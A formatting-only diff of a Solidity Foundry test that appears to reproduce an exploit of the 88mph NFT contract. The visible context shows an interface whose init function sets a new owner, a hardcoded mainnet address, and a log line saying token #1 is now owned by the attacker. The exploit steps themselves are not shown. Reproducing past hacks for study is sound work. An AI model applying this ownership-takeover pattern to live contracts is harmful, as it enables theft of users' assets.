@@ -4,17 +4,17 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 
 interface I88mph {
-    function init(
-        address newOwner,
-        string memory tokenName,
-        string memory tokenSymbol
-    ) external;
+
+    function init(address newOwner, string memory tokenName, string memory tokenSymbol) external;
     function mint(address to, uint256 tokenId) external;
     function burn(uint256 tokenId) external;
     function owner() external view returns (address);
     function ownerOf(uint256 tokenId) external view returns (address);
+
 }
+
 contract ContractTest is Test {
+
     I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);
 
     function setUp() public {
@@ -43,12 +43,8 @@ contract ContractTest is Test {
         console.log("After exploiting: NFT Owner of #1: ", mphNFT.ownerOf(1)); // token 1 now owned by us
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) public pure returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
+
 }
